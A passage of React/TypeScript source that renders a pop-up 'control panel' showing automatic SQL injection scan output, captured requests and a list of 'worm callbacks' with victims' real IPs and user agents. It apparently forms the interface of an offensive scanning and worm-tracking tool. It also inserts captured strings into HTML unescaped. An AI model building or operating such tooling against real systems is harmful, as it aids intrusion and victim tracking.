${controlData.autoExploitSqlmap ? `<section><div class="sec-head orange">Auto Injection Scan — ${controlData.autoExploitIp}</div><div style="padding:12px"><pre>${controlData.autoExploitSqlmap.substring(0, 8000)}</pre></div></section>` : ""}
${controlData.rawRequest ? `<section><div class="sec-head">Captured Request</div><div style="padding:12px"><pre>${controlData.rawRequest}</pre></div></section>` : ""}
${controlData.wormCallbacks.length > 0 ? `<section><div class="sec-head">Worm Callbacks (${controlData.wormCallbacks.length})</div><div class="callbacks">${controlData.wormCallbacks.map(cb => `<div class="cb"><span class="ts">${new Date(cb.ts).toLocaleString()}</span>${cb.callbackIp ? `<div class="rip">Real IP: ${cb.callbackIp}</div>` : ""}${cb.ua ? `<div class="ua">${cb.ua}</div>` : ""}</div>`).join("")}</div></section>` : ""}
${controlData.sqlmapResults ? `<section><div class="sec-head">Manual Injection Results</div><div style="padding:12px"><pre>${controlData.sqlmapResults.substring(0, 8000)}</pre></div></section>` : ""}
<section><div class="sec-head">Worm Banner</div><div style="padding:12px"><pre>${controlData.banner ?? "No banner captured"}</pre></div></section>
</body></html>`;
                    const w = window.open("", "_blank", "width=1100,height=800,menubar=0,toolbar=0");
                    w?.document.write(html);
                    w?.document.close();
                  }}
                  className="w-full flex items-center justify-center gap-2 px-4 py-3 border border-cyan-500/40 text-cyan-400 text-xs font-mono uppercase hover:bg-cyan-500/10 hover:border-cyan-500 transition-colors rounded"
                >
                  <MonitorSmartphone className="w-4 h-4" />
                  Open Full HTML Control Panel in New Window
                </button>
              </div>
            )}

            {!controlData && !controlLoading && (
              <div className="text-center py-8 text-primary/30 font-mono text-xs">Click Refresh to load intelligence data</div>
            )}
          </div>
        )}

      </div>
    </div>
  );
}

function statusBadge(s: string) {
  const map: Record<string, string> = {
    idle: "text-primary/40", running: "text-yellow-400 animate-pulse",
    complete: "text-primary", error: "text-red-400",
  };
  return (
    <span className={`text-[10px] font-mono uppercase border px-1.5 py-0.5 rounded border-current ${map[s] ?? "text-primary/40"}`}>
      {s}
    </span>
  );
}
